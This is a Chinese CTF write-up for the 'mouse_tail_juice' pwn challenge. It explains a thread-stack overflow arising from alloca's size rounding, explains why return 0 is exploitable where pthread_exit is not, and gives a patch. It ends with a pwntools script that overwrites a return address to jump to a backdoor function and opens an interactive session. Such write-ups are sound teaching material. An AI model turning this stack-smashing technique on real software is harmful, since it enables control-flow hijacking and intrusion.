# mouse_tail_juice

## 题目说明

本题考点本来是打算考跨线程栈攻击的,但是考虑到,不同架构线程栈区顺序问题以及跨线程栈容易出现环境无限崩溃的问题...就缩减成了线程栈的问题了...

## 漏洞分析

漏洞知识点如下:

### alloca函数

alloca在栈区上申请空间,从汇编的角度来看,本质上alloca并不是一个函数,他只是一段汇编代码,开辟一段,从栈底增加一段距离的空间,所以只能溢出八个字节...

还有这里需要调试找到地址偏移是48+8,同时看一下栈区的地址问题,所以,最后可以确定的栈溢出,只剩下1

1是因为alloca默认使用的算法是这样子的: 16 * ((v7 + 30LL) / 0x10uLL),所以只有1可以,2就超出了

### return 0 vs pthread_exit(NULL)

在线程栈结束的时候使用了return 0,导致栈区结构容易被利用,而如果使用pthread_exit,这里的返回地址是直接跳转到start_thread+xxx的位置...不可利用

### 补丁...

补丁这次很简单,只要把小于1改成小于2,就完事了,这样子虽然,过多的输入会崩溃,但是不会影响到代码执行了,当然也可以改预留后门函数

## exp

```python
#-*- coding:utf-8 –*-
from pwn import *
Debug = 0
if Debug:
	io = remote("ip",port)
else:
	io = process("./mouse_tail_juice")
io.recvuntil(': ')
io.sendline("1")
io.recvuntil('3\n')
io.recvuntil('3\n')
io.recvuntil('\n')
io.sendline("1")
payload = 56*'a' + p64(0x400e36)
io.sendline(payload)
print io.recv()

io.interactive()
```









